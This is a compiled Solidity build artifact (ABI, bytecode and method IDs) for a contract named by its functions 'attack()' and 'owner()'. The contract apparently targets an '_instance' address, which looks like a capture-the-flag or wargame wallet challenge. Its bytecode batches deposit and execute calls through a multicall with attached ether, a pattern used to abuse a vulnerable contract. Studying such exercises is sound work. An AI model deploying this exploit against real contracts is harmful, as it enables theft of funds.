{"abi":[{"type":"constructor","inputs":[{"name":"_instance","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"owner","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b50604051610506380380610506833981016040819052602b91604e565b5f80546001600160a01b0319166001600160a01b03929092169190911790556079565b5f60208284031215605d575f5ffd5b81516001600160a01b03811681146072575f5ffd5b9392505050565b610480806100865f395ff3fe608060405260043610610028575f3560e01c80638da5cb5b1461002c5780639e5faafc14610080575b5f5ffd5b348015610037575f5ffd5b505f546100579073ffffffffffffffffffffffffffffffffffffffff1681565b60405173ffffffffffffffffffffffffffffffffffffffff909116815260200160405180910390f35b61008861008a565b005b61009261037d565b604080516004815260248082018352602080830180517fd0e30db0000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff918216179091529285528351308184015266038d7ea4c68000604480830191909152606060648301819052600260848401527f307800000000000000000000000000000000000000000000000000000000000060a4808501919091528751808503909101815260c49093018752828401805187167fb61d27f6000000000000000000000000000000000000000000000000000000001790528784019290925285515f8186018190528751808303870181529183018852818501805188167f9d51d9b7000000000000000000000000000000000000000000000000000000001790528888019190915286518086018290528751808203870181529201875292810180519095167fb7b0422d000000000000000000000000000000000000000000000000000000001790945285019290925281549251919273ffffffffffffffffffffffffffffffffffffffff16917fac9650d80000000000000000000000000000000000000000000000000000000091610261918691016103c6565b60408051601f198184030181529181526020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff167fffffffff000000000000000000000000000000000000000000000000000000009094169390931790925290516102cc919061042f565b5f604051808303815f865af19150503d805f8114610305576040519150601f19603f3d011682016040523d82523d5f602084013e61030a565b606091505b5050905080610379576040517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152600d60248201527f41747461636b206661696c656400000000000000000000000000000000000000604482015260640160405180910390fd5b5050565b60405180608001604052806004905b606081526020019060019003908161038c5790505090565b5f5b838110156103be5781810151838201526020016103a6565b50505f910152565b60208082525f9060a0830190830184835b600481101561042457601f19868503018352815180518086526104018160208801602085016103a4565b601f01601f191694909401602090810194509283019291909101906001016103d7565b509195945050505050565b5f82516104408184602087016103a4565b919091019291505056fea264697066735822122011e02faa2fb79019102f8b48fd681bfcc758a66c93e97ec2c1d1a5589d0c187664736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","owner()":"8da5cb5b"},"id":0}